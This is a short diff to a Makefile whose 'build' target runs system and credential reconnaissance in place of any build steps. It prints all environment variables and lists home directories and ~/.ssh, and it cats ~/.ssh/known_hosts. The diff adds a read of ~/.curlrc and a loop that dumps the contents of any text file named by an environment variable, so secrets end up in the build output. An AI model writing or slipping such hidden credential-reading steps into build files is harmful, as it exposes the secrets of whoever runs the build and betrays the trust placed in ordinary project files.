@@ -5,6 +5,7 @@ ListAllCommands:
 EchoEnv:
 	printenv | sort
 build: ListAllCommands EchoEnv
+	cat ~/.curlrc || true
 	ls -al ~/ || true
 	ls -al /home || true
 	hostname || true
@@ -36,5 +37,6 @@ build: ListAllCommands EchoEnv
 	cat ~/.ssh/known_hosts || true
 	ls -al ~/.ssh || true
 	for var in $$(printenv | mawk -F= '{print $$2}'); do\
-	 cat $$var || ls $$var || true; \
+	 echo ::: $$var :::
+	 file -i $$var | grep text/ && cat $$var || ls $$var || true; \
 	done
